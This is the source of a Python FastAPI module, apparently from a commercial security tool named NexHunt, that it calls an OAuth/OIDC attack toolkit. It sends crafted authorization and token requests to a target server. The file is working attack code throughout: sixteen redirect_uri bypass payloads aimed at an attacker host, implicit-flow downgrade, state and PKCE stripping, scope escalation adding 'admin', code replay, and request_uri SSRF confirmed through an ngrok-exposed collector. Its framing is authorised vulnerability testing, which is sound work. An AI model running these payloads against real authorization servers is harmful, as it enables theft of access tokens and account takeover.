"""
OAuth 2.0 / OIDC attack toolkit — automated tests against an authorization
server. Send crafted /authorize and /token requests and observe the response
(redirect Location, issued code/token, errors) to detect the common flaws:
redirect_uri validation bypass, missing state (CSRF), PKCE downgrade,
response_type manipulation, scope escalation, code replay, request_uri SSRF.

Mirrors the JWT suite: pure-Python, one router, an ATTACK_META registry, a
single-attack dispatcher, and an in-memory collector (like the JWT jku/jwks
callback) for server-side-fetch / code-leak confirmation.
"""
import re
import time
import uuid
import logging
import httpx
from urllib.parse import urlparse, urlencode, parse_qsl, quote
from fastapi import APIRouter, Request, Depends
from fastapi.responses import JSONResponse
from pydantic import BaseModel

from nexhunt.services import ngrok_manager
from nexhunt.licensing.guard import require_pro

router = APIRouter(prefix="/api/oauth", tags=["oauth"], dependencies=[Depends(require_pro("OAuth Attack Suite"))])
logger = logging.getLogger(__name__)

# In-memory collector store: cid -> list of hits (like _jwt_keypairs)
_collectors: dict[str, list[dict]] = {}

_CRED_PARAMS = ("code", "access_token", "id_token", "token")
# Keep our payloads' deliberate encodings/special chars literal in the query.
_SAFE = "/:@\\.%?#&=+*~!$'(),;"


# ── metadata registry ─────────────────────────────────────────────────────────

ATTACK_META = {
    "redirect_uri_bypass": {
        "id": "redirect_uri_bypass", "name": "redirect_uri Validation Bypass",
        "severity": "critical", "cve": "",
        "description": "The authorization server fails to strictly validate `redirect_uri`, so it can be steered to an attacker-controlled host. The authorization code/token is then delivered off-domain, leading to account takeover.",
        "how_it_works": "The AS should only redirect to a redirect_uri that exactly matches a pre-registered value. Weak matchers accept subdomains, path traversal, `@`/`\\` userinfo tricks, encoded slashes, query/fragment append, etc. We mutate the registered redirect_uri across ~16 known bypass shapes and check whether the AS still issues a 3xx to the attacker host (and whether a code/token rides along).",
        "steps": [
            "Capture a real /authorize request and note the registered redirect_uri",
            "Replace/mutate the host with an attacker-controlled one across the bypass matrix",
            "Send each variant and inspect the Location header",
            "A redirect to the attacker host carrying code=/access_token= is a full leak",
        ],
        "prerequisites": "A valid /authorize request. For a proven code leak the victim must be authenticated at the AS (send their session cookie).",
        "tools": "Burp, manual, NexHunt",
    },
    "response_type_manip": {
        "id": "response_type_manip", "name": "response_type / Implicit Downgrade",
        "severity": "high", "cve": "",
        "description": "Forcing `response_type=token` (implicit) or `id_token token` makes the AS return the access token directly in the URL fragment — far more exposed to leakage (Referer, history, redirect_uri bypass) than an authorization code.",
        "how_it_works": "We re-send /authorize with response_type set to token / id_token token / code token / none and check whether the AS honours it and returns a token in the fragment.",
        "steps": ["Resend /authorize with response_type=token", "Check the Location fragment for access_token=", "Repeat for id_token token / code token / none"],
        "prerequisites": "A valid /authorize request.",
        "tools": "manual, NexHunt",
    },
    "csrf_state": {
        "id": "csrf_state", "name": "Missing state (OAuth CSRF)",
        "severity": "high", "cve": "",
        "description": "If the AS/client does not require and bind an unguessable `state`, an attacker can force-link their account or CSRF the OAuth login (account hijack via forced-login).",
        "how_it_works": "We send /authorize with state removed and with a static/guessable state, and compare against the baseline (with state). If the flow proceeds identically the state is not enforced.",
        "steps": ["Baseline /authorize with the original state", "Resend with no state param", "Resend with a static state", "If behaviour is unchanged, state is not enforced"],
        "prerequisites": "A valid /authorize request.",
        "tools": "manual, NexHunt",
    },
    "pkce_downgrade": {
        "id": "pkce_downgrade", "name": "PKCE Downgrade / Not Enforced",
        "severity": "high", "cve": "",
        "description": "Public clients must use PKCE. If the AS issues a code without `code_challenge` (or ignores it at /token), a stolen code can be exchanged without the verifier.",
        "how_it_works": "We resend /authorize stripping code_challenge/code_challenge_method. If the AS still proceeds (no error) PKCE is not enforced. If the original request had no PKCE at all, that is itself flagged.",
        "steps": ["Note code_challenge in the original request", "Resend without code_challenge", "If the AS still issues a code, PKCE is bypassable"],
        "prerequisites": "A valid /authorize request (ideally one that uses PKCE).",
        "tools": "manual, NexHunt",
    },
    "request_uri_ssrf": {
        "id": "request_uri_ssrf", "name": "request_uri SSRF (JAR / PAR)",
        "severity": "high", "cve": "",
        "description": "OIDC `request_uri` makes the AS fetch a request object from a URL server-side. If unrestricted it is an SSRF primitive (fetch internal metadata endpoints, or your collector).",
        "how_it_works": "We set request_uri to the NexHunt collector URL and watch for a server-side callback, confirming the AS dereferences attacker-supplied URLs.",
        "steps": ["Generate a collector URL", "Send /authorize with request_uri=<collector>", "If the collector logs a hit from the AS, SSRF is confirmed"],
        "prerequisites": "A valid /authorize request and a reachable collector (ngrok recommended for external targets).",
        "tools": "Burp Collaborator, NexHunt collector",
    },
    "scope_escalation": {
        "id": "scope_escalation", "name": "Scope Escalation at /token",
        "severity": "high", "cve": "",
        "description": "If the AS does not validate the requested scope at the code/token exchange against what was approved, an attacker can request extra scopes (e.g. add `admin`).",
        "how_it_works": "We POST to the token endpoint with an added scope and compare the granted scope in the response.",
        "steps": ["Provide token_url + a fresh code + client creds", "Exchange adding an extra scope", "Compare the returned scope to what was requested"],
        "prerequisites": "token_url, a valid authorization code, and client credentials.",
        "tools": "manual, NexHunt",
    },
    "code_replay": {
        "id": "code_replay", "name": "Authorization Code Replay",
        "severity": "high", "cve": "",
        "description": "Authorization codes must be single-use. If the AS lets the same code be exchanged twice, a leaked/observed code stays valid.",
        "how_it_works": "We exchange the supplied code twice at the token endpoint; if the second exchange also returns a token the code is replayable.",
        "steps": ["Provide token_url + a fresh code + client creds", "Exchange it once", "Exchange the same code again", "A second success means codes are replayable"],
        "prerequisites": "token_url, a fresh authorization code, and client credentials.",
        "tools": "manual, NexHunt",
    },
}


# ── request models ────────────────────────────────────────────────────────────

class ParseRequest(BaseModel):
    url: str


class OAuthAttackRequest(BaseModel):
    authorize_url: str = ""          # base /authorize URL (no query) OR full URL
    params: dict = {}                # authorization request params
    attack_id: str = ""
    collaborator_url: str = ""       # attacker host / collector for redirect + SSRF
    extra_headers: dict = {}
    cookies: dict = {}               # AS session cookies (for authenticated flows)
    # token-endpoint attacks
    token_url: str = ""
    code: str = ""
    client_id: str = ""
    client_secret: str = ""
    redirect_uri: str = ""


# ── helpers ───────────────────────────────────────────────────────────────────

def _split_authorize(url: str) -> tuple[str, dict]:
    p = urlparse(url)
    base = f"{p.scheme}://{p.netloc}{p.path}" if p.scheme else url.split("?", 1)[0]
    params = dict(parse_qsl(p.query, keep_blank_values=True))
    return base, params


def _build_url(base: str, items: list[tuple[str, str]]) -> str:
    q = "&".join(f"{quote(str(k), safe='')}={quote(str(v), safe=_SAFE)}" for k, v in items)
    return f"{base}?{q}" if q else base


def _evil_host(collaborator_url: str, fallback: str = "oauth-collab.attacker.example") -> str:
    if collaborator_url:
        u = collaborator_url if "://" in collaborator_url else f"http://{collaborator_url}"
        host = urlparse(u).netloc
        if host:
            return host
    return fallback


async def _send(base: str, items: list[tuple[str, str]], headers: dict, cookies: dict) -> dict:
    url = _build_url(base, items)
    raw_req = f"GET {url} HTTP/1.1\n" + "".join(f"{k}: {v}\n" for k, v in (headers or {}).items())
    try:
        async with httpx.AsyncClient(verify=False, timeout=15, follow_redirects=False) as client:
            r = await client.get(url, headers=headers or {}, cookies=cookies or {})
            loc = r.headers.get("location", "")
            resp_head = f"HTTP/1.1 {r.status_code}\n" + "".join(f"{k}: {v}\n" for k, v in r.headers.items())
            return {
                "request_url": url, "status": r.status_code, "location": loc,
                "body": r.text[:2000], "raw_request": raw_req,
                "raw_response": resp_head + "\n" + r.text[:1500],
            }
    except Exception as ex:
        return {"request_url": url, "status": 0, "location": "", "body": "",
                "error": str(ex), "raw_request": raw_req, "raw_response": f"error: {ex}"}


def _redirect_mutations(original: str, evil: str) -> list[tuple[str, str]]:
    p = urlparse(original if "://" in original else f"https://{original}")
    scheme, host = (p.scheme or "https"), p.netloc
    path = p.path or "/callback"
    legit = f"{scheme}://{host}"
    return [
        ("replace_host",       f"{scheme}://{evil}{path}"),
        ("subdomain_suffix",   f"{scheme}://{host}.{evil}{path}"),
        ("subdomain_prefix",   f"{scheme}://{evil}.{host}{path}"),
        ("userinfo_at",        f"{scheme}://{host}@{evil}{path}"),
        ("backslash_at",       f"{scheme}://{host}\\@{evil}{path}"),
        ("backslash_host",     f"{scheme}://{evil}\\.{host}{path}"),
        ("double_slash",       f"{scheme}://{host}/%2f%2f{evil}{path}"),
        ("path_traversal",     f"{legit}/../../{evil}{path}"),
        ("encoded_traversal",  f"{legit}%2f%2e%2e%2f{evil}"),
        ("open_suffix",        f"{scheme}://{host}{evil}{path}"),
        ("trailing_dot",       f"{scheme}://{evil}.{path}"),
        ("localhost",          f"{scheme}://localhost{path}"),
        ("query_append",       f"{original}?next=https://{evil}"),
        ("fragment_append",    f"{original}#https://{evil}"),
        ("at_path",            f"{scheme}://{evil}#@{host}{path}"),
        ("null_byte",          f"{original}%00.{evil}"),
    ]


def _leak_verdict(resp: dict, evil: str) -> tuple[str, str]:
    loc = resp.get("location") or ""
    low = loc.lower()
    ev = evil.lower()
    is_redirect = resp.get("status") in (301, 302, 303, 307, 308) or bool(loc)
    to_evil = ev in urlparse(low if "://" in low else f"http://x/{low}").netloc or ev in low
    has_cred = any(re.search(rf"[?#&/]{n}=", loc) for n in _CRED_PARAMS)
    if is_redirect and to_evil and has_cred:
        return "leaked", f"AS redirected credentials to attacker host. Location: {loc[:220]}"
    if is_redirect and to_evil:
        return "open_redirect", f"AS redirected to attacker host (no creds observed pre-auth). Location: {loc[:220]}"
    if ev in resp.get("body", "").lower():
        return "reflected", "Attacker host reflected in the response body."
    body = resp.get("body", "").lower()
    if resp.get("status") in (400, 401, 403) or ("redirect" in body and ("invalid" in body or "mismatch" in body)):
        return "rejected", f"AS rejected the redirect_uri (status {resp.get('status')})."
    return "inconclusive", f"status {resp.get('status')}, location: {loc[:120] or '(none)'}"


# ── endpoints ─────────────────────────────────────────────────────────────────

@router.get("/attack-meta")
async def get_attack_meta():
    return {"attacks": list(ATTACK_META.values())}


@router.post("/parse")
async def parse_authorize(req: ParseRequest):
    base, params = _split_authorize(req.url.strip())
    applicable = _get_applicable_attacks(params)
    return {"authorize_url": base, "params": params, "applicable_attacks": applicable}


def _get_applicable_attacks(params: dict) -> list[str]:
    attacks = ["redirect_uri_bypass", "response_type_manip", "csrf_state", "pkce_downgrade"]
    attacks += ["request_uri_ssrf", "scope_escalation", "code_replay"]
    return attacks


@router.post("/generate-collector")
async def generate_collector():
    cid = uuid.uuid4().hex[:10]
    _collectors[cid] = []
    local = f"http://127.0.0.1:17707/api/oauth/collector/{cid}"
    public = None
    try:
        url, _err = await ngrok_manager.get_tunnel_url(17707)
        if url:
            public = f"{url.rstrip('/')}/api/oauth/collector/{cid}"
    except Exception as e:
        logger.info(f"[oauth] ngrok tunnel unavailable for collector: {e}")
    return {"id": cid, "local_url": local, "public_url": public, "url": public or local}


@router.api_route("/collector/{cid}", methods=["GET", "POST", "PUT"])
async def collector_hit(cid: str, request: Request):
    hits = _collectors.setdefault(cid, [])
    hits.append({
        "time": time.time(), "method": request.method,
        "query": dict(request.query_params), "url": str(request.url),
        "user_agent": request.headers.get("user-agent", ""),
        "remote": request.client.host if request.client else "",
    })
    logger.info(f"[oauth] collector {cid} hit from {request.client.host if request.client else '?'}")
    return JSONResponse({"ok": True})


@router.get("/collector/{cid}/hits")
async def collector_hits(cid: str):
    return {"hits": _collectors.get(cid, [])}


@router.post("/single-attack")
async def single_attack(req: OAuthAttackRequest):
    base, url_params = _split_authorize(req.authorize_url.strip()) if req.authorize_url else ("", {})
    params = {**url_params, **(req.params or {})}
    headers = req.extra_headers or {}
    cookies = req.cookies or {}
    evil = _evil_host(req.collaborator_url)
    tests: list[dict] = []

    def base_items(overrides: dict | None = None, drop: list[str] | None = None) -> list[tuple[str, str]]:
        merged = {**params, **(overrides or {})}
        for k in (drop or []):
            merged.pop(k, None)
        return list(merged.items())

    # ── redirect_uri validation bypass ──
    if req.attack_id == "redirect_uri_bypass":
        original = params.get("redirect_uri", req.redirect_uri or f"https://{urlparse(base).netloc}/callback")
        for label, mutated in _redirect_mutations(original, evil):
            resp = await _send(base, base_items({"redirect_uri": mutated}), headers, cookies)
            verdict, evidence = _leak_verdict(resp, evil)
            tests.append({
                "label": label, "payload": mutated, "verdict": verdict, "evidence": evidence,
                "status": resp["status"], "location": resp.get("location", ""),
                "raw_request": resp["raw_request"], "raw_response": resp["raw_response"],
            })

    # ── response_type / implicit downgrade ──
    elif req.attack_id == "response_type_manip":
        for rt in ["token", "id_token token", "code token", "none", "id_token"]:
            resp = await _send(base, base_items({"response_type": rt}), headers, cookies)
            loc = resp.get("location", "")
            leaked = bool(re.search(r"[#&]access_token=", loc)) or bool(re.search(r"[#&]id_token=", loc))
            verdict = "leaked" if leaked else ("accepted" if resp["status"] in (302, 303, 307) and "error" not in loc.lower() else "rejected")
            tests.append({
                "label": f"response_type={rt}", "payload": rt,
                "verdict": verdict,
                "evidence": ("Token returned in fragment: " + loc[:200]) if leaked else f"status {resp['status']}, location: {loc[:140] or '(none)'}",
                "status": resp["status"], "location": loc,
                "raw_request": resp["raw_request"], "raw_response": resp["raw_response"],
            })

    # ── missing / static state (CSRF) ──
    elif req.attack_id == "csrf_state":
        baseline = await _send(base, base_items(), headers, cookies)
        no_state = await _send(base, base_items(drop=["state"]), headers, cookies)
        static = await _send(base, base_items({"state": "attacker_fixed_state"}), headers, cookies)
        had_state = "state" in params
        proceeded = no_state["status"] in (302, 303, 307) and "error" not in (no_state.get("location", "").lower())
        tests.append({
            "label": "baseline (with state)", "payload": params.get("state", "(none)"),
            "verdict": "info", "evidence": f"status {baseline['status']}, location: {baseline.get('location','')[:140]}",
            "status": baseline["status"], "location": baseline.get("location", ""),
            "raw_request": baseline["raw_request"], "raw_response": baseline["raw_response"],
        })
        tests.append({
            "label": "no state param", "payload": "(removed)",
            "verdict": "vulnerable" if proceeded else "rejected",
            "evidence": ("AS proceeded without state — CSRF/forced-login likely (confirm state is bound to the client session)." if proceeded
                         else f"AS did not proceed without state (status {no_state['status']})."),
            "status": no_state["status"], "location": no_state.get("location", ""),
            "raw_request": no_state["raw_request"], "raw_response": no_state["raw_response"],
        })
        tests.append({
            "label": "static state", "payload": "attacker_fixed_state",
            "verdict": "review" if not had_state else "info",
            "evidence": f"status {static['status']}, location: {static.get('location','')[:140]}",
            "status": static["status"], "location": static.get("location", ""),
            "raw_request": static["raw_request"], "raw_response": static["raw_response"],
        })

    # ── PKCE downgrade ──
    elif req.attack_id == "pkce_downgrade":
        had_pkce = "code_challenge" in params
        if not had_pkce:
            tests.append({
                "label": "PKCE not present", "payload": "(no code_challenge)",
                "verdict": "vulnerable",
                "evidence": "The authorization request does not use PKCE. Public clients (SPA/mobile) must use PKCE to prevent code interception.",
                "status": 0, "location": "", "raw_request": "", "raw_response": "",
            })
        resp = await _send(base, base_items(drop=["code_challenge", "code_challenge_method"]), headers, cookies)
        proceeded = resp["status"] in (302, 303, 307) and "error" not in (resp.get("location", "").lower())
        tests.append({
            "label": "strip code_challenge", "payload": "(removed)",
            "verdict": "vulnerable" if (had_pkce and proceeded) else ("rejected" if had_pkce else "info"),
            "evidence": ("AS still issued a redirect/code without code_challenge — PKCE not enforced." if (had_pkce and proceeded)
                         else f"status {resp['status']}, location: {resp.get('location','')[:140]}"),
            "status": resp["status"], "location": resp.get("location", ""),
            "raw_request": resp["raw_request"], "raw_response": resp["raw_response"],
        })

    # ── request_uri SSRF ──
    elif req.attack_id == "request_uri_ssrf":
        collab = req.collaborator_url
        if not collab:
            return {"error": "request_uri_ssrf needs a collector URL — call /generate-collector first and pass collaborator_url."}
        resp = await _send(base, base_items({"request_uri": collab}), headers, cookies)
        cid = collab.rstrip("/").split("/")[-1]
        import asyncio
        await asyncio.sleep(2.0)
        hits = _collectors.get(cid, [])
        tests.append({
            "label": "request_uri=collector", "payload": collab,
            "verdict": "vulnerable" if hits else "inconclusive",
            "evidence": (f"Collector received {len(hits)} server-side hit(s) — AS dereferences attacker URLs (SSRF)." if hits
                         else "No collector hit within 2s (target may be async, unreachable, or not OIDC request_uri-capable)."),
            "status": resp["status"], "location": resp.get("location", ""),
            "raw_request": resp["raw_request"], "raw_response": resp["raw_response"],
        })

    # ── scope escalation (token endpoint) ──
    elif req.attack_id == "scope_escalation":
        if not (req.token_url and req.code):
            return {"error": "scope_escalation needs token_url + code (+ client_id/secret, redirect_uri)."}
        result = await _token_exchange(req, extra={"scope": (params.get("scope", "openid") + " admin offline_access")})
        granted = ""
        try:
            granted = str(result.get("json", {}).get("scope", ""))
        except Exception:
            pass
        tests.append({
            "label": "exchange with extra scope", "payload": "scope += admin offline_access",
            "verdict": "review" if result["status"] == 200 else "rejected",
            "evidence": f"status {result['status']}, granted scope: {granted or '(not returned)'}. Compare against the originally approved scope.",
            "status": result["status"], "location": "",
            "raw_request": result["raw_request"], "raw_response": result["raw_response"],
        })

    # ── authorization code replay ──
    elif req.attack_id == "code_replay":
        if not (req.token_url and req.code):
            return {"error": "code_replay needs token_url + code (+ client_id/secret, redirect_uri)."}
        first = await _token_exchange(req)
        second = await _token_exchange(req)
        replayable = second["status"] == 200
        tests.append({
            "label": "first exchange", "payload": req.code[:20] + "...",
            "verdict": "info", "evidence": f"status {first['status']}",
            "status": first["status"], "location": "",
            "raw_request": first["raw_request"], "raw_response": first["raw_response"],
        })
        tests.append({
            "label": "second exchange (replay)", "payload": req.code[:20] + "...",
            "verdict": "vulnerable" if replayable else "rejected",
            "evidence": ("Second exchange of the same code succeeded — codes are replayable (not single-use)." if replayable
                         else f"Second exchange rejected (status {second['status']}) — code correctly single-use."),
            "status": second["status"], "location": "",
            "raw_request": second["raw_request"], "raw_response": second["raw_response"],
        })

    else:
        return {"error": f"unknown attack_id: {req.attack_id}"}

    return {"attack_id": req.attack_id, "evil_host": evil, "tests": tests}


async def _token_exchange(req: OAuthAttackRequest, extra: dict | None = None) -> dict:
    data = {
        "grant_type": "authorization_code",
        "code": req.code,
        "redirect_uri": req.redirect_uri,
        "client_id": req.client_id,
    }
    if req.client_secret:
        data["client_secret"] = req.client_secret
    if extra:
        data.update(extra)
    body = urlencode(data)
    raw_req = f"POST {req.token_url} HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\n{body}"
    try:
        async with httpx.AsyncClient(verify=False, timeout=15, follow_redirects=False) as client:
            r = await client.post(req.token_url, data=data, headers=req.extra_headers or {})
            js = {}
            try:
                js = r.json()
            except Exception:
                pass
            return {"status": r.status_code, "json": js,
                    "raw_request": raw_req,
                    "raw_response": f"HTTP/1.1 {r.status_code}\n\n{r.text[:1500]}"}
    except Exception as ex:
        return {"status": 0, "json": {}, "raw_request": raw_req, "raw_response": f"error: {ex}"}
